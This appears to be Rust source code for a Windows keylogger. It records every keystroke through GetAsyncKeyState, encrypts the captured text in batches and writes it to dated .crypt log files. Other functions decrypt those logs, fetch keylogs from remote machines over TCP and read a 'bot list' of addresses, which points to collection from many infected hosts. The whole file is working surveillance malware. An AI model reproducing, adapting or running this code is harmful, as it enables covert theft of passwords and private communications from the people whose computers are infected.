extern crate user32;
//#[link(name = "sodium", kind = "static")]
extern crate sodiumoxide;
extern crate time;
extern crate termsize;

mod win_key_codes;

use win_key_codes::*;
use sodiumoxide::crypto::secretbox;

use std::io::Write;
use std::io::Read;
use std::collections::HashMap;

pub fn key_log(key_path: &str) {
    let mut to_write_queue = String::new();

    let mut key_downed: HashMap<u8, bool> = HashMap::new();
    loop {
        std::thread::sleep(std::time::Duration::from_millis(10));
        for i in 8..255u8 {
            let is_current_key_down: bool;
            let capslock_on: bool;
            unsafe {
                is_current_key_down = user32::GetAsyncKeyState(i as i32) & (1 << 15) != 0;
                capslock_on = user32::GetKeyState(VK_CAPITAL as i32) & 1 != 0
            }
            if is_current_key_down {
                key_downed.insert(i, true);
            } else if *key_downed.get(&i).unwrap_or(&false) {
                key_downed.insert(i, false);

                let shift_status = key_downed.get(&VK_SHIFT).unwrap_or(&false);
                let ctrl_status = key_downed.get(&VK_CONTROL).unwrap_or(&false);
                let alt_status = key_downed.get(&VK_MENU).unwrap_or(&false);

                let mut current_str = match i {
                    0x30 ... 0x5A | VK_SPACE => {
                        let mut current_char = (i as char).to_string();
                        if !(*shift_status ^ capslock_on) {
                            current_char = current_char.to_lowercase();
                        }
                        current_char
                    }
                    VK_BACK => "[Backspace]".to_string(),
                    VK_TAB => "[Tab]".to_string(),
                    VK_OEM_2 => "/".to_string(),
                    VK_ESCAPE => "[Esc]".to_string(),
                    VK_RETURN => "[Enter]\n".to_string(),
                    VK_LEFT => "[Left]".to_string(),
                    VK_RIGHT => "[Right]".to_string(),
                    VK_UP => "[Up]".to_string(),
                    VK_DOWN => "[Down]".to_string(),
                    VK_DELETE => "[Delete]".to_string(),
                    0xA0 ... 0xA5 | VK_SHIFT | VK_MENU | VK_CONTROL => "".to_string(),
                    _ => { "[Not Impl]".to_string() }
                };

                if *ctrl_status | *alt_status {
                    current_str = format!("[{}{}{}{}]",
                                          if *ctrl_status { "Ctrl + " } else { "" },
                                          if *shift_status { "Shift + " } else { "" },
                                          if *alt_status { "Alt + " } else { "" },
                                          current_str.to_uppercase());
                    current_str += "\n";
                }
                save_string_to_queue(&current_str, &mut to_write_queue, key_path)
            }
        }
    }
}

fn save_string_to_queue(to_write: &String, string_queue: &mut String, key_loc: &str) {
    if to_write.is_empty() { return; }
    string_queue.push_str(to_write);

    if string_queue.len() < 100 { return; }
    let string_queue_owned = pad(string_queue, 144, '-', true);

    string_queue.clear();

    let (key, nonce) = generate_key_and_nonce(key_loc).expect("Key file modified");

    let encrypted = secretbox::seal(string_queue_owned.as_bytes(), &nonce, &key);

    let now = time::now();

    std::fs::create_dir("./logs").unwrap_or_default();

    let mut file = std::fs::OpenOptions::new()
        .write(true)
        .append(true)
        .create(true)
        .open(format!("./logs/{:05}-{:02}-{:02}_Keylogs.crypt", now.tm_year + 11900, now.tm_mon, now.tm_mday)).expect("Failed to open file");

    file.write([&nonce[..], encrypted.as_ref()].concat().as_ref()).expect("Can't write to file");
}

fn pad(original: &String, width: usize, pad_char: char, truncate: bool) -> String {
    if width <= original.len() { if truncate { return original[..width].to_string(); } else { return original.to_string(); } }
    let diff = width - original.len();
    let mut s = original.clone();
    for _ in 0..diff { s.push(pad_char) }
    s
}

pub fn generate_key_and_nonce(key_loc: &str) -> Result<(secretbox::Key, secretbox::Nonce), Box<std::error::Error>> {
    if let Ok(mut file) = std::fs::File::open(key_loc) {
        let mut contents = Vec::new();
        file.read_to_end(&mut contents)?;//.expect("File read error");

        let key = secretbox::Key::from_slice(&contents[..]).ok_or("Key not the correct size")?;
        let nonce = secretbox::gen_nonce();

        return Ok((key, nonce));
    } else {
        println!("Key file doesn't exist, generating new key");
        let mut file = std::fs::File::create(key_loc)?;

        let key = secretbox::gen_key();
        let nonce = secretbox::gen_nonce();

        file.write(&key[..])?;

        return Ok((key, nonce));
    }
}

//TODO: Distill this function so that no file load happens here
pub fn decrypt(log_file_path: &str, key_file_path: &str) -> Result<(), Box<std::error::Error>> {
    use std::io::Read;
    use std::io::BufRead;
    let key: secretbox::Key = {
        let mut contents = Vec::new();
        std::fs::File::open(key_file_path)?.read_to_end(&mut contents)?;
        secretbox::Key::from_slice(&contents[..(secretbox::KEYBYTES)]).ok_or("Key not the correct size")?
    };

    let mut file = std::io::BufReader::with_capacity(160 + secretbox::NONCEBYTES, std::fs::File::open(&log_file_path).expect("Log file not found"));

    println!("{}", "-".repeat(termsize::get().expect("Not running a terminal? (Terminal width retrieval error)").cols as usize - 1));
    println!("\n    Now reading from: {}\n", log_file_path);
    println!("{}\n", "-".repeat(termsize::get().expect("Not running a terminal? (Terminal width retrieval error)").cols as usize - 1));
    loop {
        let buffer_length = {
            let data = file.fill_buf().expect("Read buffer failed");
            if data.len() == 0 { break; }

            let nonce = secretbox::Nonce::from_slice(&data[..secretbox::NONCEBYTES]).expect("Nonce parse fail");
            let answer = secretbox::open(&data[secretbox::NONCEBYTES..], &nonce, &key).expect("Decrypt fail");
            let answer = String::from_utf8(answer).expect("Utf8 parse problem");
            println!("{}", answer);
            data.len()
        };
        file.consume(buffer_length);
    }
    println!("\n{}", "-".repeat(termsize::get().expect("Not running a terminal? (Terminal width retrieval error)").cols as usize - 1));
    Ok(())
}

pub fn load_all_key_logs(log_folder_path: &str) -> Result<Vec<(String, Vec<u8>)>, Box<std::error::Error>> {
    let paths = std::fs::read_dir(log_folder_path)?;
    Ok(paths.filter_map(|name| {
        name.ok().and_then(|path| {
            let path = path.path();
            if path.extension().unwrap_or(std::ffi::OsStr::new(".fail")) == "crypt" {
                return Some((path.file_name().unwrap().to_str().unwrap().to_owned(), load_key_logs(&path.to_str().unwrap()).expect("hmm")));
            }
            None
        })
    }).collect())
}

pub fn load_key_logs(log_file_path: &str) -> Result<Vec<u8>, Box<std::error::Error>> {
    let mut contents = Vec::new();
    std::fs::File::open(log_file_path)?.read_to_end(&mut contents)?;
    Ok(contents)
}

pub fn retrieve_remote_keylogs(addr: &str) -> Vec<(String, Vec<u8>)> {
    let mut stream = std::net::TcpStream::connect(addr).expect("Error connecting");
    let mut data = Vec::new();

    stream.read_to_end(&mut data).unwrap();
    let (header, content) = data.split_at(data.iter().position(|item| item == &('\n' as u8)).expect("Header error"));
    let header: Vec<usize> = std::str::from_utf8(header).expect("Header error").split(";").map(|s: &str| s.parse::<usize>().expect("Header error")).collect::<Vec<usize>>();

    let mut true_content: Vec<Vec<u8>> = Vec::new();
    header.iter().fold(1usize, |acc, item| {
        true_content.push(content[acc..(acc + item)].to_vec());
        acc + item
    });
    //println!("Name of [0] = {}", std::str::from_utf8(true_content[0].as_ref()).unwrap());
    let mut output: Vec<(String, Vec<u8>)> = Vec::new();
    for i in 0..true_content.len() / 2 {
        let i = i * 2;
        output.push((std::str::from_utf8(true_content[i].as_ref()).unwrap().to_owned(), true_content[i + 1].clone()));
    }
    output
}


pub fn parse_bot_list(bot_list_path: &str) -> Result<Vec<String>, Box<std::error::Error>> {
    let mut list_data = String::new();
    std::fs::File::open(bot_list_path)?.read_to_string(&mut list_data)?;
    Ok(list_data.split("\n").map(|s: &str| s.trim().to_owned()).collect::<Vec<String>>())
}

fn print_in_hex(input: &Vec<u8>) {
    let mut s = String::new();
    for byte in input {
        s.push_str(&format!("{:X} ", &byte));
    }
    println!("{}", s);
}